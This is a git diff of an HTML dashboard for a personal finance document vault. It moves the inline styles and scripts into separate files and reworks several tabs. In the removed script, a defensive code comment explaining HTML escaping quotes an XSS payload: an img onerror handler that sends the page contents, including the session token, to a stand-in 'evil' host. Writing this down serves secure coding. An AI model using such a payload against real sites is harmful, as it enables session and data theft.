@@ -7,284 +7,7 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@400;600;700&display=swap" rel="stylesheet">
-<style>
-  /* White/blue observability console. Data-ink first, no chartjunk. */
-  :root {
-    --bg:#f6f8fb; --panel:#ffffff; --panel2:#eef3f9; --line:#d8e0ea; --line2:#e6ecf3;
-    --ink:#0f1b2d; --dim:#5a6b82; --faint:#94a3b8;
-    --blue:#2563eb; --blue-d:#1d4ed8; --blue-l:#dbeafe; --blue-xl:#eff6ff;
-    --in:#059669; --out:#dc2626; --xfer:#2563eb; --inv:#7c3aed; --ok:#059669; --warn:#d97706; --bad:#dc2626;
-    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,monospace;
-  }
-  *{box-sizing:border-box;margin:0;padding:0}
-  body{background:var(--bg);color:var(--ink);
-       font:13.5px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,sans-serif;
-       padding:0 0 80px}
-
-  /* ── top bar ──────────────────────────────────────────────────── */
-  .topbar{background:var(--panel);border-bottom:1px solid var(--line);
-          padding:14px 32px;display:flex;align-items:baseline;justify-content:space-between;
-          position:sticky;top:0;z-index:10;flex-wrap:wrap;gap:10px}
-  h1{font-family:"Unbounded",sans-serif;font-size:15px;font-weight:600;letter-spacing:-.2px}
-  h1 span{color:var(--faint);font-weight:400;font-family:var(--mono)}
-  .conn{font:11px var(--mono);color:var(--faint);display:flex;align-items:center;gap:7px}
-  .dot{width:7px;height:7px;border-radius:50%;background:var(--faint)}
-  .dot.live{background:var(--ok)} .dot.dead{background:var(--bad)}
-
-  /* ── tabs ─────────────────────────────────────────────────────── */
-  .tabs{display:flex;gap:0;background:var(--panel);border-bottom:1px solid var(--line);
-        padding:0 32px;overflow-x:auto}
-  .tabs button{background:transparent;border:0;border-bottom:2px solid transparent;
-               color:var(--dim);font:600 12px/1 -apple-system,sans-serif;letter-spacing:.3px;
-               padding:11px 16px;cursor:pointer;white-space:nowrap}
-  .tabs button:hover{color:var(--ink)}
-  .tabs button.on{color:var(--blue);border-bottom-color:var(--blue)}
-  .tab{display:none;padding:24px 32px;max-width:1280px;margin:0 auto}
-  .tab.on{display:block}
-
-  /* ── period selector ──────────────────────────────────────────── */
-  .periods{display:flex;gap:4px;margin-bottom:18px;flex-wrap:wrap}
-  .periods button{background:var(--panel);border:1px solid var(--line);color:var(--dim);
-                  font:600 10.5px var(--mono);letter-spacing:.6px;padding:6px 12px;
-                  cursor:pointer;text-transform:uppercase;border-radius:4px}
-  .periods button:hover{border-color:var(--blue);color:var(--blue)}
-  .periods button.on{background:var(--blue);border-color:var(--blue);color:#fff}
-
-  /* ── health strip ─────────────────────────────────────────────── */
-  .health{display:flex;gap:1px;background:var(--line);border:1px solid var(--line);
-          border-radius:6px;overflow:hidden;margin-bottom:24px;flex-wrap:wrap}
-  .health .c{background:var(--panel);padding:9px 14px;flex:1 1 auto;min-width:110px}
-  .health .k{font:9.5px var(--mono);letter-spacing:.7px;text-transform:uppercase;color:var(--faint)}
-  .health .v{font:600 15px var(--mono);color:var(--ink);margin-top:3px;font-variant-numeric:tabular-nums}
-  .health .v.ok{color:var(--ok)} .health .v.bad{color:var(--bad)} .health .v.warn{color:var(--warn)}
-
-  /* ── section heads ────────────────────────────────────────────── */
-  section{margin-bottom:28px}
-  h2{font-size:11px;letter-spacing:1px;text-transform:uppercase;color:var(--dim);
-     margin-bottom:12px;font-weight:700;display:flex;align-items:baseline;gap:10px}
-  h2 .sub{color:var(--faint);font-weight:400;text-transform:none;letter-spacing:0;font-size:11.5px}
-
-  /* ── money heroes ─────────────────────────────────────────────── */
-  .heroes{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:10px}
-  .hero{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:16px 18px}
-  .hero.click{cursor:pointer}
-  .hero.click:hover{border-color:var(--blue);box-shadow:0 1px 4px rgba(37,99,235,.1)}
-  .hero.sel{border-color:var(--blue);box-shadow:0 0 0 2px var(--blue-l)}
-  .hero .k{font-size:10px;letter-spacing:.9px;text-transform:uppercase;color:var(--dim);font-weight:600}
-  .hero .v{font:600 27px/1.15 var(--mono);letter-spacing:-1px;margin-top:8px;
-           font-variant-numeric:tabular-nums}
-  .hero.in .v{color:var(--in)} .hero.out .v{color:var(--out)}
-  .hero.x .v{color:var(--xfer)} .hero.inv .v{color:var(--inv)}
-  .hero .n{font:11px var(--mono);color:var(--faint);margin-top:6px}
-  .hero .n b{color:var(--dim);font-weight:600}
-  .hero .sub{font:10.5px var(--mono);color:var(--faint);margin-top:5px}
-  .hero .sub .warn{color:var(--warn)}
-
-  .empty{color:var(--faint);font:11.5px var(--mono);padding:10px 0}
-
-  /* ── pipeline state board ─────────────────────────────────────── */
-  .board{display:flex;gap:1px;background:var(--line);border:1px solid var(--line);
-         border-radius:6px;overflow:hidden;margin-bottom:14px;flex-wrap:wrap}
-  .state{background:var(--panel);padding:9px 12px;flex:1 1 auto;min-width:88px;text-align:center}
-  .state .k{font:9px var(--mono);letter-spacing:.6px;text-transform:uppercase;color:var(--faint)}
-  .state .v{font:600 18px var(--mono);color:var(--ink);margin-top:3px;font-variant-numeric:tabular-nums}
-  .state.term .v{color:var(--faint)}
-  .state.complete .v{color:var(--ok)}
-  .state.failed .v,.state.stalled .v{color:var(--bad)}
-  .state.duplicate .v,.state.irrelevant .v{color:var(--warn)}
-  .state.password_needed .v{color:var(--warn)}
-  .state.active .v{color:var(--blue)}
-  .state .v.zero{color:var(--faint);opacity:.4}
-
-  /* ── pipeline two-column ──────────────────────────────────────── */
-  .pcols{display:grid;grid-template-columns:1fr 360px;gap:16px;align-items:start}
-
-  /* ── intake table ─────────────────────────────────────────────── */
-  .intake{border:1px solid var(--line);background:var(--panel);border-radius:6px;
-          max-height:560px;overflow-y:auto;font:11.5px var(--mono)}
-  .irow{padding:9px 13px;border-bottom:1px solid var(--line2);display:grid;
-        grid-template-columns:1fr auto auto;gap:8px;align-items:baseline}
-  .irow:last-child{border-bottom:0}
-  .irow:hover{background:var(--panel2)}
-  .irow .fn{color:var(--ink);word-break:break-all}
-  .irow .meta{color:var(--faint);font-size:10px;margin-top:3px}
-  .irow .meta .err{color:var(--bad)}
-  .irow .meta .stall{color:var(--warn);font-weight:600}
-  .pill{font:600 9px var(--mono);letter-spacing:.5px;padding:2px 6px;border:1px solid;
-        text-transform:uppercase;white-space:nowrap;border-radius:3px}
-  .pill.complete{color:var(--ok);border-color:#a7f3d0;background:#ecfdf5}
-  .pill.failed{color:var(--bad);border-color:#fecaca;background:#fef2f2}
-  .pill.duplicate,.pill.irrelevant{color:var(--warn);border-color:#fde68a;background:#fffbeb}
-  .pill.password_needed{color:var(--warn);border-color:#fde68a;background:#fffbeb}
-  .pill.archived{color:var(--faint);border-color:var(--line);background:var(--panel2)}
-  .pill.queued,.pill.received,.pill.stable,.pill.hashed,.pill.triaged{color:var(--dim);border-color:var(--line)}
-  .pill.processing{color:var(--blue);border-color:var(--blue-l);background:var(--blue-xl)}
-  .age{color:var(--faint);font-size:10px;text-align:right;white-space:nowrap}
-
-  /* ── live feed ────────────────────────────────────────────────── */
-  .feed{border:1px solid var(--line);background:var(--panel);border-radius:6px;
-        max-height:560px;overflow-y:auto;font:11.5px var(--mono)}
-  .fe{padding:7px 12px;border-bottom:1px solid var(--line2);display:flex;gap:9px;
-      align-items:baseline;animation:slide .25s ease}
-  @keyframes slide{from{opacity:0;transform:translateY(-4px)}to{opacity:1}}
-  .fe:last-child{border-bottom:0}
-  .fe .t{color:var(--faint);font-size:10px;flex:0 0 52px}
-  .fe .n{flex:1;color:var(--dim);word-break:break-word}
-  .fe.DocumentReceived .n{color:var(--ink)}
-  .fe.MarkdownReady .n,.fe.AnalysisComplete .n{color:var(--dim)}
-  .fe.TransactionRecorded .n{color:var(--in)}
-  .fe.MatchProposed .n{color:var(--ok);font-weight:600}
-  .fe.DocumentDuplicate .n{color:var(--warn)}
-  .fe.JobStateChanged .n{color:var(--blue)}
-  .fe.Failed .n,.fe.failed .n{color:var(--bad)}
-
-  /* ── evidence card ────────────────────────────────────────────── */
-  .card{border:1px solid var(--line);background:var(--panel);border-radius:6px;
-        padding:16px;margin-top:18px}
-  .card h3{font-size:12px;margin-bottom:12px;font-weight:600}
-  .card .sum{border-top:1px solid var(--line2);margin-top:12px;padding-top:11px;
-             font-size:12.5px;color:var(--ok)}
-  .doc{border:1px solid var(--line2);padding:9px 11px;margin-bottom:7px;border-radius:4px}
-  .doc .fn{font-size:12px}
-  .doc .rf{font:10.5px var(--mono);color:var(--faint);margin-top:5px;word-break:break-all}
-  .doc .rf em{color:var(--ok);font-style:normal}
-  .prov{font:10.5px var(--mono);color:var(--faint);margin-top:10px;
-        padding-top:9px;border-top:1px solid var(--line2)}
-
-  /* ── generic panels / cards ───────────────────────────────────── */
-  .panel{border:1px solid var(--line);background:var(--panel);border-radius:6px;padding:16px 18px;margin-bottom:7px}
-  .panel h3{font:600 11px var(--mono);letter-spacing:.7px;text-transform:uppercase;
-            color:var(--dim);margin-bottom:12px}
-  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
-  .settings-cols{display:grid;grid-template-columns:1fr 1fr;gap:7px;align-items:stretch}
-  /* Danger Zone — subtle red border, white background, heavy red button. */
-  .danger-zone{margin-top:7px;max-width:calc(50% - 4px)}
-  .danger-panel{border:1px solid color-mix(in srgb, #c0392b 25%, var(--line));
-            background:color-mix(in srgb, #c0392b 4%, var(--panel));
-            border-radius:6px;padding:16px 18px}
-  .danger-panel h3{font:600 11px var(--mono);letter-spacing:.7px;text-transform:uppercase;
-            color:#c0392b;margin-bottom:14px}
-  .danger-options{display:flex;flex-direction:column;gap:10px;margin-bottom:14px}
-  .danger-opt{display:flex;align-items:flex-start;gap:10px;padding:10px 12px;
-            border:1px solid var(--line2);border-radius:5px;cursor:pointer;
-            background:var(--panel);transition:border-color .15s}
-  .danger-opt:hover{border-color:color-mix(in srgb, #c0392b 30%, var(--line))}
-  .danger-opt input[type=radio]{margin-top:3px;accent-color:#c0392b}
-  .danger-opt-body{display:flex;flex-direction:column;gap:2px}
-  .danger-opt-title{font:600 12.5px -apple-system,BlinkMacSystemFont,sans-serif;color:var(--ink)}
-  .danger-opt-desc{font:11.5px/1.4 -apple-system,BlinkMacSystemFont,sans-serif;color:var(--dim)}
-  .danger-confirm-row{display:flex;align-items:center;gap:8px;flex-wrap:wrap;
-            margin-bottom:14px;padding:12px;border:1px solid color-mix(in srgb, #c0392b 20%, var(--line));
-            border-radius:5px;background:color-mix(in srgb, #c0392b 6%, var(--panel))}
-  .danger-confirm-label{font:11.5px -apple-system,BlinkMacSystemFont,sans-serif;color:#7f1d1d}
-  .danger-confirm-label b{color:#c0392b}
-  .danger-confirm-input{font:12px var(--mono);border:1px solid var(--line);border-radius:4px;
-            padding:5px 10px;width:120px;text-transform:uppercase;letter-spacing:1px}
-  .danger-cancel-btn{font:600 11px var(--mono);letter-spacing:.5px;text-transform:uppercase;
-            background:var(--panel2);color:var(--dim);border:1px solid var(--line);
-            border-radius:4px;padding:7px 14px;cursor:pointer}
-  .danger-cancel-btn:hover{background:var(--line2)}
-  .danger-go-btn{font:600 11px var(--mono);letter-spacing:.5px;text-transform:uppercase;
-            background:#c0392b;color:#fff;border:none;border-radius:4px;padding:7px 14px;cursor:pointer}
-  .danger-go-btn:disabled{background:#e6a0a0;cursor:not-allowed}
-  .danger-go-btn:not(:disabled):hover{background:#a52a1a}
-  .danger-btn{display:block;width:100%;font:600 12px var(--mono);letter-spacing:.5px;
-            text-transform:uppercase;background:#c0392b;color:#fff;border:none;
-            border-radius:5px;padding:11px 16px;cursor:pointer}
-  .danger-btn:disabled{background:#c0392b;cursor:not-allowed}
-  .danger-btn:not(:disabled):hover{background:#a52a1a}
-  .settings-cols > div{min-width:0}
-  .settings-cols .panel{margin-bottom:0;height:100%;display:flex;flex-direction:column}
-  @media (max-width:780px){.settings-cols{grid-template-columns:1fr}}
-  .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
-
-  /* ── forms ────────────────────────────────────────────────────── */
-  .field{margin-bottom:14px}
-  .field label{display:block;font:600 10.5px var(--mono);letter-spacing:.5px;
-               text-transform:uppercase;color:var(--dim);margin-bottom:5px}
-  .field .hint{font:11px var(--mono);color:var(--faint);margin-top:4px}
-  .field .hint .ok{color:var(--ok)} .field .hint .warn{color:var(--warn)} .field .hint .bad{color:var(--bad)}
-  input[type=text],input[type=password],select,textarea{
-    width:100%;font:13px var(--mono);padding:8px 10px;border:1px solid var(--line);
-    border-radius:4px;background:var(--panel);color:var(--ink)}
-  input:focus,select:focus,textarea:focus{outline:0;border-color:var(--blue);box-shadow:0 0 0 2px var(--blue-l)}
-  .row{display:flex;gap:10px;align-items:flex-end}
-  .row .field{flex:1;margin-bottom:14px}
-  button.act{background:var(--blue);color:#fff;border:0;border-radius:4px;
-             font:600 12px -apple-system,sans-serif;padding:8px 16px;cursor:pointer}
-  button.act:hover{background:var(--blue-d)}
-  button.act:disabled{background:var(--faint);cursor:not-allowed}
-  button.ghost{background:var(--panel);color:var(--dim);border:1px solid var(--line);
-               border-radius:4px;font:600 12px -apple-system,sans-serif;padding:7px 14px;cursor:pointer}
-  button.ghost:hover{border-color:var(--blue);color:var(--blue)}
-  .save-row{display:flex;gap:10px;align-items:center;margin-top:6px}
-  .save-row .msg{font:11.5px var(--mono);color:var(--faint)}
-  .save-row .msg.ok{color:var(--ok)} .save-row .msg.bad{color:var(--bad)}
-
-  /* ── people / entities ────────────────────────────────────────── */
-  .ent{display:grid;grid-template-columns:1fr auto auto auto;gap:10px;align-items:baseline;
-       padding:10px 0;border-bottom:1px solid var(--line2);font:12px var(--mono)}
-  .ent:last-child{border-bottom:0}
-  .ent .nm{color:var(--ink);font-weight:600}
-  .ent .nm .sub{color:var(--faint);font-weight:400;font-size:10.5px;margin-left:6px}
-  .ent .kind{font:9px var(--mono);color:#fff;background:var(--dim);padding:1px 6px;
-             border-radius:3px;text-transform:uppercase;letter-spacing:.5px}
-  .ent .kind.person{background:var(--blue)} .ent .kind.organisation{background:var(--inv)}
-  .ent .kind.account{background:var(--warn)} .ent .kind.instrument{background:var(--ok)}
-  .ent .stat{font:9px var(--mono);padding:1px 6px;border:1px solid;border-radius:3px;text-transform:uppercase}
-  .ent .stat.confirmed{color:var(--ok);border-color:#a7f3d0}
-  .ent .stat.candidate{color:var(--warn);border-color:#fde68a}
-  .ent .ct{color:var(--faint);font-size:10.5px;text-align:right}
-
-  /* ── review items ─────────────────────────────────────────────── */
-  .rev{border:1px solid var(--line);background:var(--panel);border-radius:6px;
-       padding:13px 15px;margin-bottom:10px}
-  .rev .q{font-size:13px;color:var(--ink);margin-bottom:8px}
-  .rev .kind{font:600 9px var(--mono);color:var(--blue);text-transform:uppercase;
-             letter-spacing:.5px;margin-bottom:5px}
-  .rev .kind.failed_job{color:var(--bad)} .rev .kind.orphan_document{color:var(--warn)}
-  .rev .meta{font:11px var(--mono);color:var(--faint);margin-bottom:8px}
-  .rev .actions{display:flex;gap:8px;flex-wrap:wrap}
-  .rev .actions button{font:600 11px -apple-system,sans-serif;padding:6px 12px;border-radius:4px;cursor:pointer}
-  .rev .actions .yes{background:var(--ok);color:#fff;border:0}
-  .rev .actions .no{background:var(--panel);color:var(--dim);border:1px solid var(--line)}
-  .rev .actions .yes:hover{background:#047857} .rev .actions .no:hover{border-color:var(--blue);color:var(--blue)}
-
-  /* ── learning ─────────────────────────────────────────────────── */
-  .qcard{border:1px solid var(--line);background:var(--panel);border-radius:6px;
-         padding:14px 16px;margin-bottom:10px}
-  .qcard .trig{font:600 9px var(--mono);color:var(--blue);text-transform:uppercase;
-               letter-spacing:.5px;margin-bottom:6px}
-  .qcard .q{font-size:13px;color:var(--ink);margin-bottom:10px}
-  .qcard .ctx{font:11px var(--mono);color:var(--faint);margin-bottom:10px;white-space:pre-wrap}
-  .qcard .opts{display:flex;gap:8px;flex-wrap:wrap}
-  .qcard .opts button{font:600 11px -apple-system,sans-serif;padding:6px 12px;border-radius:4px;cursor:pointer}
-  .qcard .opts .a{background:var(--blue);color:#fff;border:0}
-  .qcard .opts .a:hover{background:var(--blue-d)}
-  .qcard .opts .d{background:var(--panel);color:var(--faint);border:1px solid var(--line)}
-  .qcard .opts .d:hover{color:var(--dim)}
-  .rule{display:grid;grid-template-columns:auto 1fr auto;gap:10px;align-items:baseline;
-        padding:8px 0;border-bottom:1px solid var(--line2);font:11.5px var(--mono)}
-  .rule:last-child{border-bottom:0}
-  .rule .k{color:var(--blue);font-weight:600}
-  .rule .v{color:var(--dim)}
-  .rule .n{color:var(--faint);font-size:10.5px}
-
-  /* ── document list ────────────────────────────────────────────── */
-  .drow{display:grid;grid-template-columns:1fr auto auto;gap:10px;align-items:baseline;
-        padding:10px 13px;border-bottom:1px solid var(--line2);font:11.5px var(--mono);cursor:pointer}
-  .drow:last-child{border-bottom:0}
-  .drow:hover{background:var(--panel2)}
-  .drow .fn{color:var(--ink);word-break:break-all}
-  .drow .meta{color:var(--faint);font-size:10px;margin-top:3px}
-  .drow .dt{color:var(--faint);font-size:10px;text-align:right;white-space:nowrap}
-  .dlist{border:1px solid var(--line);background:var(--panel);border-radius:6px;max-height:480px;overflow-y:auto}
-
-  footer{margin:34px 32px 0;padding-top:14px;border-top:1px solid var(--line);
-         font:10.5px var(--mono);color:var(--faint);max-width:1280px;margin-left:auto;margin-right:auto;
-         text-align:center;display:flex;justify-content:center;align-items:center;gap:14px}
-  footer a{color:#00e;text-decoration:underline}
-</style>
+<link rel="stylesheet" href="/ui/ui.css">
 </head>
 <body>
 
@@ -294,16 +17,16 @@
 </div>
 
 <div class="tabs" id="tabs">
-  <button data-tab="obs" class="on">Dashboard</button>
-  <button data-tab="review">Documents</button>
-  <button data-tab="people">People</button>
-  <button data-tab="learning">Learning</button>
-  <button data-tab="settings">Settings</button>
+  <button data-tab="obs" class="on">Your Money</button>
+  <button data-tab="review">Documents Browser</button>
+  <button data-tab="people">People &amp; Accounts</button>
+  <button data-tab="learning">Learning Review</button>
+  <button data-tab="settings">Settings &amp; Customisations</button>
 </div>
 
 <!-- ════════════════════════════════════════════════════════════════════════
      DASHBOARD TAB
-// ════════════════════════════════════════════════════════════════════════ -->
+════════════════════════════════════════════════════════════════════════ -->
 <div class="tab on" id="tab-obs">
   <div class="periods" id="periods"></div>
 
@@ -335,16 +58,12 @@
   </section>
 
   <section>
-    <h2>Documents pipeline <span class="sub">what is coming in and what is happening to it</span></h2>
+    <h2>Documents pipeline</h2>
     <div class="board" id="board"></div>
     <div class="pcols">
       <div>
         <h2 style="margin-top:4px">Intake <span class="sub" id="intakeCount">— items</span></h2>
         <div class="intake" id="intake"><div class="empty">waiting for intake…</div></div>
-      </div>
-      <div>
-        <h2 style="margin-top:4px">Live events</h2>
-        <div class="feed" id="feed"><div class="fe"><span class="t">—</span><span class="n">waiting for events…</span></div></div>
       </div>
     </div>
   </section>
@@ -352,61 +71,81 @@
 
 <!-- ════════════════════════════════════════════════════════════════════════
      SETTINGS TAB
-// ════════════════════════════════════════════════════════════════════════ -->
+════════════════════════════════════════════════════════════════════════ -->
 <div class="tab" id="tab-settings">
+  <!-- Suggestion banners (shown only when jurisdiction suggestions exist and slot is unset) -->
+  <div id="suggestionBanners"></div>
+
   <div class="settings-cols">
       <div class="panel">
-        <h3>Inference provider — primary</h3>
+        <h3>Primary inference</h3>
+        <div class="hint" style="margin-bottom:10px">Used for fast text tasks like categorization, normalization, and short explanations.</div>
         <div class="field">
           <label>Provider</label>
-          <select id="aiProvider"></select>
+          <div class="provider-picker" id="aiProviderPicker"></div>
+          <select id="aiProvider" style="display:none"></select>
         </div>
         <div class="field" id="aiCustomUrlRow" style="display:none">
           <label>Base URL</label>
           <input type="text" id="aiBaseUrl" placeholder="https://your-provider.com/v1">
         </div>
+        <div class="field" id="aiUrlRow">
+          <label>Base URL</label>
+          <input type="text" id="aiBaseUrlRo" readonly style="opacity:0.6">
+        </div>
         <div class="field">
           <label>API key</label>
-          <input type="password" id="aiApiKey" placeholder="paste your API key">
-          <div class="hint" id="aiKeySrc"></div>
+          <div id="aiKeyContainer">
+            <input type="password" id="aiApiKey" placeholder="paste your API key">
+            <div class="hint" id="aiKeySrc"></div>
+          </div>
         </div>
         <div class="field">
           <label>Model</label>
-          <input type="text" id="aiModel" list="aiModelList" placeholder="auto-fetched on provider select, or type your own">
-          <datalist id="aiModelList"></datalist>
+          <select id="aiModel"><option value="">select a provider first</option></select>
+          <div class="hint" id="aiModelNote"></div>
         </div>
         <div class="save-row">
-          <button class="act" id="aiTest">Test</button>
+          <button class="act" id="aiTest">Test connection</button>
           <span class="msg" id="aiMsg"></span>
         </div>
       </div>
 
       <div class="panel">
-        <h3>Inference provider — secondary (vision / fallback)</h3>
+        <h3>Secondary inference</h3>
+        <div class="hint" style="margin-bottom:10px">Used for image and document tasks like receipts, screenshots, and scanned statements.</div>
         <div class="field">
           <label>Provider</label>
-          <select id="ai2Provider"></select>
+          <div class="provider-picker" id="ai2ProviderPicker"></div>
+          <select id="ai2Provider" style="display:none"></select>
         </div>
         <div class="field" id="ai2CustomUrlRow" style="display:none">
           <label>Base URL</label>
           <input type="text" id="ai2BaseUrl" placeholder="https://your-provider.com/v1">
         </div>
+        <div class="field" id="ai2UrlRow">
+          <label>Base URL</label>
+          <input type="text" id="ai2BaseUrlRo" readonly style="opacity:0.6">
+        </div>
         <div class="field">
           <label>API key</label>
-          <input type="password" id="ai2ApiKey" placeholder="paste your API key">
-          <div class="hint" id="ai2KeySrc"></div>
+          <div id="ai2KeyContainer">
+            <input type="password" id="ai2ApiKey" placeholder="paste your API key">
+            <div class="hint" id="ai2KeySrc"></div>
+          </div>
         </div>
-        <div class="field">
+        <div class="field" id="ai2ModelRow">
           <label>Model</label>
-          <input type="text" id="ai2Model" list="ai2ModelList" placeholder="auto-fetched on provider select, or type your own">
-          <datalist id="ai2ModelList"></datalist>
+          <select id="ai2Model"><option value="">select a provider first</option></select>
+          <div class="hint" id="ai2ModelNote"></div>
         </div>
         <div class="save-row">
-          <button class="act" id="ai2Test">Test</button>
+          <button class="act" id="ai2Test">Test connection</button>
           <span class="msg" id="ai2Msg"></span>
         </div>
       </div>
   </div>
+
 
   <div class="settings-cols" style="margin-top:7px">
       <div class="panel">
@@ -507,41 +246,60 @@
 
 <!-- ════════════════════════════════════════════════════════════════════════
      PEOPLE TAB
-// ════════════════════════════════════════════════════════════════════════ -->
+════════════════════════════════════════════════════════════════════════ -->
 <div class="tab" id="tab-people">
-  <h2>People <span class="sub">identity management — owner, members, candidates</span></h2>
+  <h2>People &amp; Accounts <span class="sub">manage identities of owners, members, organisations, accounts and instruments</span></h2>
+
   <div class="panel">
-    <h3>People <span style="color:var(--faint);font-weight:400;text-transform:none" id="peopleCount"></span></h3>
-    <div id="peopleList"><div class="empty">loading…</div></div>
+    <h3>Household <span style="color:var(--faint);font-weight:400;text-transform:none" id="houseCount"></span></h3>
+    <div class="hint" style="margin:-6px 0 10px">The people this vault belongs to. Exactly one is you (owner); others are members who share it (spouse, family).</div>
+    <div id="houseList"><div class="empty">loading…</div></div>
   </div>
+
+  <div class="panel collapse" id="otherPanel">
+    <h3 class="collapse-hdr">Other people <span style="color:var(--faint);font-weight:400;text-transform:none" id="otherCount"></span> <span class="collapse-arrow">▾</span></h3>
+    <div class="collapse-body">
+      <div class="hint" style="margin:-6px 0 10px">Everyone else the documents name — merchants, landlords, tenants, employers. Classify each by their relationship to you.</div>
+      <div id="otherList"><div class="empty">loading…</div></div>
+    </div>
+  </div>
+
+  <div class="panel collapse" id="orgPanel">
+    <h3 class="collapse-hdr">Organisations <span style="color:var(--faint);font-weight:400;text-transform:none" id="orgCount"></span> <span class="collapse-arrow">▾</span></h3>
+    <div class="collapse-body">
+      <div class="hint" style="margin:-6px 0 10px">Merchants, companies, and other non-person entities. Click to inspect cross-kind identifier conflicts.</div>
+      <div id="orgList"><div class="empty">loading…</div></div>
+    </div>
+  </div>
+
   <div class="panel">
-    <h3>All entities <span style="color:var(--faint);font-weight:400;text-transform:none" id="entCount"></span></h3>
-    <div id="entList"><div class="empty">loading…</div></div>
+    <h3>Accounts <span style="color:var(--faint);font-weight:400;text-transform:none" id="acctCount"></span></h3>
+    <div class="hint" style="margin:-6px 0 10px">Banks, brokers, wallets, and instruments. Click to inspect cross-kind identifier conflicts.</div>
+    <div id="acctList"><div class="empty">loading…</div></div>
   </div>
-  <div id="personDetail"></div>
+
 </div>
 
 <!-- ════════════════════════════════════════════════════════════════════════
      DOCUMENTS REVIEW TAB
-// ════════════════════════════════════════════════════════════════════════ -->
+════════════════════════════════════════════════════════════════════════ -->
 <div class="tab" id="tab-review">
-  <h2>Documents Review <span class="sub">review queue + document ledger</span></h2>
+  <div class="periods" id="periodsReview"></div>
 
-  <div class="panel">
-    <h3>Review queue <span style="color:var(--faint);font-weight:400;text-transform:none" id="revCount"></span></h3>
-    <div id="revList"><div class="empty">loading…</div></div>
-  </div>
+  <section>
+    <h2>Documents pipeline</h2>
+    <div class="board" id="boardReview"></div>
+  </section>
 
   <div class="panel">
     <h3>Documents <span style="color:var(--faint);font-weight:400;text-transform:none" id="docCount"></span></h3>
-    <div class="dlist" id="docList"><div class="empty">loading…</div></div>
+    <div id="docList"><div class="empty">loading…</div></div>
   </div>
-  <div id="docDetail"></div>
 </div>
 
 <!-- ════════════════════════════════════════════════════════════════════════
      LEARNING TAB
-// ════════════════════════════════════════════════════════════════════════ -->
+════════════════════════════════════════════════════════════════════════ -->
 <div class="tab" id="tab-learning">
   <h2>Learning <span class="sub">curiosity engine — questions and learned rules</span></h2>
 
@@ -573,50 +331,18 @@
 
 <footer id="footer"></footer>
 
+<!-- Scripts loaded in order: shared utils, then feature modules, then init. -->
+<script>const TOKEN = "%%TOKEN%%";</script>
+<script src="/ui/ui.js"></script>
+<script src="/ui/dashboard.js"></script>
+<script src="/ui/settings.js"></script>
+<script src="/ui/people.js"></script>
+<script src="/ui/documents.js"></script>
+<script src="/ui/learning.js"></script>
 <script>
-const TOKEN = "%%TOKEN%%";
-const H = { Authorization: "Bearer " + TOKEN };
-const api = (p) => fetch(p, { headers: H }).then((r) => r.json());
-const apiPost = (p, body) => fetch(p, {
-  method: "POST", headers: { ...H, "content-type": "application/json" },
-  body: JSON.stringify(body || {}),
-}).then((r) => r.json());
-
-const money = (m) => m === null || m === undefined ? "—"
-  : "₹" + (m / 100).toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
-const clock = () => new Date().toTimeString().slice(0, 8);
-const ago = (iso) => {
-  if (!iso) return "—";
-  const s = Math.max(0, Math.round((Date.now() - Date.parse(iso)) / 1000));
-  if (s < 60) return s + "s";
-  if (s < 3600) return Math.round(s / 60) + "m";
-  if (s < 86400) return Math.round(s / 3600) + "h";
-  return Math.round(s / 86400) + "d";
-};
-
-/**
- * Escape API- and event-derived values before they reach an innerHTML sink.
- *
- * This is not theoretical: attachment filenames come from email headers, flow
- * through intake into `documents.original_filename`, and are rendered in the
- * transaction list, the evidence card, and the live feed. Anyone who can email
- * the vault address could otherwise name a file
- * `<img src=x onerror=fetch('//evil/'+document.body.innerHTML)>` and exfiltrate
- * the page — which, on this page, includes the API session token.
- *
- * Quotes are escaped too because several values land inside single-quoted
- * attributes (data-id, class), where &apos; alone would let an attacker close
- * the attribute.
- */
-const esc = (v) => v === null || v === undefined ? "" : String(v)
-  .replace(/&/g, "&amp;")
-  .replace(/</g, "&lt;")
-  .replace(/>/g, "&gt;")
-  .replace(/"/g, "&quot;")
-  .replace(/'/g, "&#39;");
-
-// ── tab navigation ───────────────────────────────────────────────
-let activeTab = localStorage.getItem("q2av_tab") || "obs";
+// ── tab navigation + init ────────────────────────────────────────
+// TAB_LOADERS references functions from all feature modules, so it
+// must be defined after all scripts have loaded.
 const TAB_LOADERS = {
   settings: loadSettings,
   people: loadPeople,
@@ -634,841 +360,6 @@ document.getElementById("tabs").querySelectorAll("button").forEach((b) =>
 // Restore the saved tab on load.
 document.querySelectorAll(".tabs button").forEach((x) => x.classList.toggle("on", x.dataset.tab === activeTab));
 document.querySelectorAll(".tab").forEach((t) => t.classList.toggle("on", t.id === "tab-" + activeTab));
-
-// ── observability: period selector ───────────────────────────────
-let selected = null;
-let period = localStorage.getItem("q2av_period") || "this_fy";
-const PERIODS = [
-  { key: "this_month", label: "This Month" },
-  { key: "last_month", label: "Last month" },
-  { key: "this_fy", label: "This FY" },
-  { key: "last_fy", label: "Last FY" },
-  { key: "all", label: "All time" },
-];
-function renderPeriods() {
-  const el = document.getElementById("periods");
-  el.innerHTML = PERIODS.map((p) =>
-    "<button class='" + (p.key === period ? "on" : "") + "' data-p='" + esc(p.key) + "'>"
-    + esc(p.label) + "</button>").join("");
-  el.querySelectorAll("button").forEach((b) =>
-    b.onclick = () => { period = b.dataset.p; localStorage.setItem("q2av_period", period); renderPeriods(); refreshObs(); });
-}
-
-// ── observability: health strip ──────────────────────────────────
-async function refreshHealth() {
-  const h = await api("/v1/health");
-  // Version lives in the footer only, not the header.
-  document.getElementById("footer").innerHTML =
-    "&copy; " + new Date().getFullYear() + " <a href='https://thecontrarian.in' target='_blank' rel='noopener'>Mahesh Shantaram</a>"
-    + " <span style='color:var(--line)'>·</span> " + esc(h.version);
-}
-
-// ── observability: money section ─────────────────────────────────
-async function refreshMoney() {
-  const s = await api("/v1/snapshot?period=" + encodeURIComponent(period));
-  document.getElementById("moneyPeriod").textContent = "— " + s.period.label;
